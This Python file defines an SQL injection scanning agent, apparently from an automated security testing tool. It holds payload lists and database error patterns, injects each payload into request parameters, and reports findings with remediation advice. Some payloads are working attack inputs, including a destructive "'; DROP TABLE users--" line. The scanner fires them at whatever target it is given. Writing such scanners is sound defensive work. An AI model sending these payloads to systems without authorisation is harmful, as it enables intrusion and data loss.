"""
SQL Injection Security Agent - Detects SQL injection vulnerabilities.
"""
from typing import List, Dict, Any
import re
from urllib.parse import urljoin, urlparse, parse_qs

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType


class SQLInjectionAgent(BaseSecurityAgent):
    """
    SQL Injection testing agent.
    
    Tests for various SQL injection vulnerabilities:
    - Error-based injection
    - Boolean-based blind injection
    - Time-based blind injection
    - UNION-based injection
    """
    
    agent_name = "sql_injection"
    agent_description = "Detects SQL Injection vulnerabilities"
    vulnerability_types = [VulnerabilityType.SQL_INJECTION]
    
    # SQL injection payloads
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
        "'; DROP TABLE users--",
        "1; SELECT * FROM users",
        "' AND '1'='2",
        "admin'--",
        "' OR 1=1--",
        "' OR 'a'='a",
    ]
    
    TIME_BASED_PAYLOADS = [
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--",
        "1' AND SLEEP(3)--",
        "1; SELECT SLEEP(3)--",
    ]
    
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT 1,2,3--",
    ]
    
    # SQL error patterns
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"macromedia\.jdbc\.sqlserver",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SQLSrv",
        r"SQL Server.*Driver",
        r"\bORA-[0-9]+\b",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
        r"oracle\.jdbc\.driver",
        r"SQLite\.Exception",
        r"sqlite3\.OperationalError",
        r"SQLITE_ERROR",
        r"SQLite error",
        r"pdo_sqlite",
        r"Access Database Engine",
        r"JET Database Engine",
        r"Access.*ODBC.*Driver",
        r"Sybase message",
        r"Warning.*sybase",
        r"DB2 SQL error",
        r"db2_connect",
        r"db2_exec",
        r"Informix ODBC Driver",
        r"com\.informix\.jdbc",
        r"Dynamic SQL Error",
        r"sql error",
        r"syntax error at or near",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
    
    def __init__(self, **kwargs):
        """Initialize SQL Injection agent."""
        super().__init__(**kwargs)
        self.error_patterns = [re.compile(p, re.IGNORECASE) for p in self.SQL_ERROR_PATTERNS]
    
    async def scan(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        technology_stack: List[str] = None
    ) -> List[AgentResult]:
        """
        Scan for SQL injection vulnerabilities.
        
        Args:
            target_url: Base URL
            endpoints: Endpoints to test
            technology_stack: Detected technologies
            
        Returns:
            List of found vulnerabilities
        """
        results = []
        
        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "GET")
            params = endpoint.get("params", {})
            
            # Test each parameter
            for param_name in params.keys():
                # Test error-based injection
                error_result = await self._test_error_based(
                    url, method, params, param_name
                )
                if error_result:
                    results.append(error_result)
                    continue  # Found vuln, skip other tests for this param
                
                # Test time-based injection
                time_result = await self._test_time_based(
                    url, method, params, param_name
                )
                if time_result:
                    results.append(time_result)
        
        return results
    
    async def _test_error_based(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str
    ) -> AgentResult | None:
        """
        Test for error-based SQL injection.
        
        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test
            
        Returns:
            AgentResult if vulnerable, None otherwise
        """
        original_value = params.get(param_name, "")
        
        for payload in self.ERROR_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, method="GET", params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response is None:
                    continue
                
                response_text = response.text
                
                # Check for SQL error patterns
                for pattern in self.error_patterns:
                    match = pattern.search(response_text)
                    if match:
                        # Found SQL error - potential vulnerability
                        evidence = match.group(0)
                        
                        # Use AI to analyze
                        ai_analysis = await self.analyze_with_ai(
                            vulnerability_type="SQL Injection (Error-Based)",
                            context=f"Tested parameter '{param_name}' with payload: {payload}",
                            response_data=response_text[:1000]
                        )
                        
                        if ai_analysis.get("is_vulnerable", True):
                            return self.create_result(
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                is_vulnerable=True,
                                severity=Severity.CRITICAL,
                                confidence=ai_analysis.get("confidence", 90),
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"SQL Injection in '{param_name}' parameter",
                                description=f"An error-based SQL injection vulnerability was detected in the '{param_name}' parameter. The application returned a database error when a malicious payload was injected.",
                                evidence=f"SQL Error: {evidence}\nPayload: {payload}",
                                ai_analysis=ai_analysis.get("reason", ""),
                                remediation="Use parameterized queries (prepared statements) instead of string concatenation. Never trust user input directly in SQL queries.",
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-89",
                                reference_links=[
                                    "https://owasp.org/Top10/A03_2021-Injection/",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                request_data={"params": test_params, "payload": payload},
                                response_snippet=response_text[:500]
                            )
                
            except Exception as e:
                print(f"[SQLi Agent] Error testing {param_name}: {e}")
        
        return None
    
    async def _test_time_based(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str
    ) -> AgentResult | None:
        """
        Test for time-based blind SQL injection.
        
        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test
            
        Returns:
            AgentResult if vulnerable, None otherwise
        """
        import time
        
        for payload in self.TIME_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                if method.upper() == "GET":
                    response = await self.make_request(url, method="GET", params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                elapsed_time = time.time() - start_time
                
                if response is None:
                    continue
                
                # If response took significantly longer (>2.5 seconds for 3-second sleep)
                if elapsed_time >= 2.5:
                    # Confirm with another request
                    start_time = time.time()
                    if method.upper() == "GET":
                        await self.make_request(url, method="GET", params=params)
                    else:
                        await self.make_request(url, method=method, data=params)
                    normal_time = time.time() - start_time
                    
                    # Original request should be much faster
                    if elapsed_time - normal_time >= 2:
                        return self.create_result(
                            vulnerability_type=VulnerabilityType.SQL_INJECTION,
                            is_vulnerable=True,
                            severity=Severity.CRITICAL,
                            confidence=85,
                            url=url,
                            parameter=param_name,
                            method=method,
                            title=f"Blind SQL Injection (Time-Based) in '{param_name}'",
                            description=f"A time-based blind SQL injection vulnerability was detected. The application response was delayed by approximately {elapsed_time:.1f} seconds when a time-delay payload was injected.",
                            evidence=f"Response delay: {elapsed_time:.1f}s (normal: {normal_time:.1f}s)\nPayload: {payload}",
                            remediation="Use parameterized queries. Implement input validation and sanitization. Use stored procedures where possible.",
                            owasp_category="A03:2021 – Injection",
                            cwe_id="CWE-89",
                            reference_links=[
                                "https://owasp.org/Top10/A03_2021-Injection/",
                                "https://portswigger.net/web-security/sql-injection/blind"
                            ],
                            request_data={"params": test_params, "payload": payload}
                        )
                
            except Exception as e:
                print(f"[SQLi Agent] Time-based test error: {e}")
        
        return None
